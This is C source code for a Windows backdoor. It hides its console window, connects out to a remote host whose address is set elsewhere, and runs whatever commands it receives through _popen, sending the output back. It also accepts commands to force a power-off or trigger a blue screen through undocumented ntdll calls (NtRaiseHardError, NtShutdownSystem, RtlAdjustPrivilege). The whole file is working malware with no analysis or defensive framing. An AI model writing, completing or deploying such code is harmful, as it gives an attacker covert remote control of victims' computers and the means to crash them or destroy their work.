#include "definitions.h"

typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;
ULONG hardErrorResp_Receiver;
NTSTATUS(NTAPI* RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
NTSTATUS(NTAPI* NtShutdownSystem)(_In_ SHUTDOWN_ACTION);
NTSTATUS(NTAPI* NtSetSystemPowerState)(_In_ POWER_ACTION Power_state, _In_ BOOLEAN ResumeAlarm, _In_ BOOLEAN ForcePowerDown);
NTSTATUS(NTAPI* NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
NTSTATUS NtReceiver;
INT iSock;

INT WINAPI init_shellDrop(VOID) {
	char buffer[1024];
	char memContain[1024];
	char cResp[18384];

	while (1) {
	jump:
		RtlZeroMemory(buffer, sizeof(buffer));
		RtlZeroMemory(memContain, sizeof(memContain));
		RtlZeroMemory(cResp, sizeof(cResp));
		recv(iSock, buffer, 1024, NULL);
		if (strncmp("q", buffer, 1) == 0) {
			closesocket(iSock);
			WSACleanup();
			return 0x00;
		}
		if (strncmp("forceOff()", buffer, 11) == 0) {
			NtSetSystemPowerState(PowerActionShutdownOff, PowerSystemShutdown, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);
			NtShutdownSystem(ShutdownPowerOff);
			return 0x00;
		}
		if (strncmp("blueScreen()", buffer, 13) == 0) {
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, NULL, 6, &hardErrorResp_Receiver);
		}
		else {
			FILE* pFile = _popen(buffer, "r");
			while (fgets(memContain, 1024, pFile) != NULL) {
				strcat(cResp, memContain);
			}
			send(iSock, cResp, sizeof(cResp), NULL);
			fclose(pFile);
		}
	}
}

VOID WINAPI checkNtCalls(VOID) {  //needs debugging
	if (RtlAdjustPrivilege) {
		BOOLEAN pRecv;
		NtReceiver = RtlAdjustPrivilege(19, TRUE, FALSE, &pRecv);
		printf("%s\n", "RtlAdjustPrivilege loaded");
		if (NtReceiver) {
			return TRUE;
		}
		/*else {
			NtReceiver = RtlAdjustPrivilege(20, TRUE, FALSE, &pRecv);
			if (NtReceiver) {
				return 0x02;
			}
			else {
				continue;
			}
		}*/
	}
	else {
		return 0x03;
	}
	if (NtShutdownSystem) {
		printf("%s\n", "NtShutdownSystem loaded");
	}
	else {
		return 0x04;
	}
	if (NtSetSystemPowerState) {
		printf("%s\n", "NtSetSystemPowerState loaded");
	}
	else{
		return 0x05;
	}
	if (NtRaiseHardError) {
		printf("%s\n", "NtRaiseHardError loaded");
	}
	else{
		return 0x06;
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPCSTR lpCmdLine, int nCmdShow) {

	CreateMutexA(NULL, NULL, L"consoleShell");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return TRUE;
	}
	HMODULE hNTDLL = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNTDLL, "RtlAdjustPrivilege");
	NtShutdownSystem = (PVOID)GetProcAddress(hNTDLL, "NtShutdownSystem");
	NtSetSystemPowerState = (PVOID)GetProcAddress(hNTDLL, "NtSetSystemPowerState");
	NtRaiseHardError = (PVOID)GetProcAddress(hNTDLL, "NtRaiseHardError");

	checkNtCalls();
	//BOOLEAN pRecv;
	//NtReceiver = RtlAdjustPrivilege(19, TRUE, FALSE, &pRecv);

	HWND hConsole;

	AllocConsole();
	hConsole = GetConsoleWindow();
	ShowWindow(hConsole, SW_HIDE);

	if (WSAStartup(MAKEWORD(2, 0), &wData) != NULL) {
		return 0x00;
	}

	iSock = socket(AF_INET, SOCK_STREAM, 0);
	memset(&socket_stdIn, NULL, sizeof(socket_stdIn));
	socket_stdIn.sin_family = AF_INET;
	socket_stdIn.sin_addr.s_addr = inet_addr(sIP);
	socket_stdIn.sin_port = htons(sPort);

	while (connect(iSock, (struct sockaddr*)&socket_stdIn, sizeof(socket_stdIn)) != NULL) {
		Sleep(10);
	}
	
	init_shellDrop();
}